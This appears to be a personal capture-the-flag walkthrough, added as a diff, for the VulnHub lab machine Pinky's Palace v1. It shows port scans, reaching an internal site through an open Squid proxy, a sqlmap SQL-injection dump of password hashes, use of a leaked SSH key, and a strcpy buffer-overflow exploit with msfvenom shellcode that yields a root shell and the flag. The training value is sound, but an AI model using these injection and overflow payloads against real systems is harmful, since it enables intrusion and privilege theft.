@@ -1,0 +1,166 @@
+https://www.vulnhub.com/entry/pinkys-palace-v1,225/
+goal: read file /root/root.txt
+
+IP Address: 192.168.83.101
+
+Ports:
+8080/tcp  open  http-proxy
+31337/tcp open  Elite (squid http proxy 3.5.23)
+64666/tcp open  unknown (ssh OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0))
+
+
+Port info:
+PORT      STATE SERVICE    VERSION
+8080/tcp  open  http       nginx 1.10.3
+|_http-server-header: nginx/1.10.3
+|_http-title: 403 Forbidden
+31337/tcp open  http-proxy Squid http proxy 3.5.23
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported: GET HEAD
+|_http-server-header: squid/3.5.23
+|_http-title: ERROR: The requested URL could not be retrieved
+64666/tcp open  ssh        OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 df:02:12:4f:4c:6d:50:27:6a:84:e9:0e:5b:65:bf:a0 (RSA)
+|   256 0a:ad:aa:c7:16:f7:15:07:f0:a8:50:23:17:f3:1c:2e (ECDSA)
+|_  256 4a:2d:e5:d8:ee:69:61:55:bb:db:af:29:4e:54:52:2f (EdDSA)
+MAC Address: E0:F8:47:04:4E:38 (Apple)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+STEPS:
+
+Navigating to 192.168.83.101:8080 gives a 403 Forbidden error
+Port 31337 is a proxy server. Changing http proxy in browser settings.
+192.168.83.101 still forbidden
+Go to 127.0.0.1:8080 > success
+
+Enumeration:
+/littlesecrets-main/  **(login page)**
+/littlesecrets-main/login.php
+/littlesecrets-main/logs.php
+
+
+SQLI
+sqlmap --url http://127.0.0.1:8080/littlesecrets-main/login.php --level=3 --proxy http://192.168.83.101:31337 --data "user=admin&pass=admin" --dbms=mysql --technique=T -D pinky_sec_db -T users --dump
+  **note** when prompted to skip some test, select no
+
+Database: pinky_sec_db
+Table: users
+[2 entries]
++-----+----------------------------------+-------------+
+| uid | pass                             | user        |
++-----+----------------------------------+-------------+
+| 1   | f543dbfeaf238729831a321c7a68bee4 | pinky       |
+| 2   | d60dffed7cc0d87e1f4a11aa06ca73af | pinkymanage |
++-----+----------------------------------+-------------+
+(both most likely md5 based on hashid)
+
+pinkymanage : 3pinkysaf33pinkysaf3
+pinky : ???
+
+
+
+SSH
+
+moving through files fine /var/www/html/littlesecrets-main/ultrasecretadminf1l35
+
+private key located <above path> /.ultrasecret  (encoded base64)
+cat .ultrasecret | base64 -d > ~/pinky_private_key
+save private key to file and set to r/w 
+chmod 600 pinky_private_key
+ssh pinky@127.0.0.1 -i pinky_private_key -p 64666
+
+
+PINKY
+find note that he's made a program to replace sudo
+vulnerable to buffer overflow
+./adminhelper `python -c "print 'A' * 500"`
+
+use gdb
+
+
+GDB
+run with gdb
+gdb --args ./adminhelper `python -c "print 'A' * 300"`
+
+(gdb) set disassembly-flavor intel
+(gdb) disas main
+
+Dump of assembler code for function main:
+   0x0000000000000813 <+0>:	push   rbp
+   0x0000000000000814 <+1>:	mov    rbp,rsp
+   0x0000000000000817 <+4>:	sub    rsp,0x50
+   0x000000000000081b <+8>:	mov    DWORD PTR [rbp-0x44],edi
+   0x000000000000081e <+11>:	mov    QWORD PTR [rbp-0x50],rsi
+   0x0000000000000822 <+15>:	cmp    DWORD PTR [rbp-0x44],0x2
+   0x0000000000000826 <+19>:	jne    0x84e <main+59>
+   0x0000000000000828 <+21>:	mov    rax,QWORD PTR [rbp-0x50]
+   0x000000000000082c <+25>:	add    rax,0x8
+   0x0000000000000830 <+29>:	mov    rdx,QWORD PTR [rax]
+   0x0000000000000833 <+32>:	lea    rax,[rbp-0x40]
+   0x0000000000000837 <+36>:	mov    rsi,rdx
+   0x000000000000083a <+39>:	mov    rdi,rax
+   0x000000000000083d <+42>:	call   0x640 <strcpy@plt>
+   0x0000000000000842 <+47>:	lea    rax,[rbp-0x40]
+   0x0000000000000846 <+51>:	mov    rdi,rax
+   0x0000000000000849 <+54>:	call   0x650 <puts@plt>
+   0x000000000000084e <+59>:	mov    eax,0x0
+   0x0000000000000853 <+64>:	leave  
+   0x0000000000000854 <+65>:	ret    
+End of assembler dump.
+
+
+strcpy is the exploitable function
+by trial and error, I get 72 bytes for the first error
+
+SHELLCODE
+msfvenom -a x64 -p linux/x64/exec CMD=/bin/sh -b '\x00\x0b\x0d\x0a\x18\x0c\x23\x24\x28\x29' | hexdump -v -e '"\\\x" 1/1 "%02x"'
+
+\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff\x48\xbb\x21\x79\x9f\xe6\x92\xad\x97\x0e\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x4b\x42\xc7\x7f\xda\x16\xb8\x6c\x48\x17\xb0\x95\xfa\xad\xc4\x46\xa8\x9e\xf7\xcb\xf1\xad\x97\x46\xa8\x9f\xcd\x0e\x9a\xad\x97\x0e\x0e\x1b\xf6\x88\xbd\xde\xff\x0e\x77\x2e\xd7\x6f\x74\xa2\x92\x0e
+
+
+upload or copy [getenv.c] into server
+gcc getenv.c -o getenv
+
+export EXPL=`python -c "print '<shellcode above>'"`
+
+then 
+/getenv EXPL ./adminhelper
+EXPL will be at 0x7fffffffee53
+
+
+place in reverse order
+
+./adminhelper `python -c "print 'A' * 72 + '\x53\xee\xff\xff\xff\x7f'"`
+
+Gives us /bin/sh shell
+
+#whoami
+root
+
+
+# cat /root/root.txt
+===========[!!!CONGRATS!!!]===========
+
+[+] You r00ted Pinky's Palace Intermediate!
+[+] I hope you enjoyed this box!
+[+] Cheers to VulnHub!
+[+] Twitter: @Pink_P4nther
+
+Flag: 99975cfc5e2eb4c199d38d4a2b2c03ce
+
+
+
+Help from sources (much thanks!!):
+https://www.taharamine.me/2018/03/pinkys-palace-v1-walkthrough.html
+https://d7x.promiselabs.net/2018/03/22/ctf-pinkys-palace-v1-vulnhub-ctf-walkthrough/
+
+
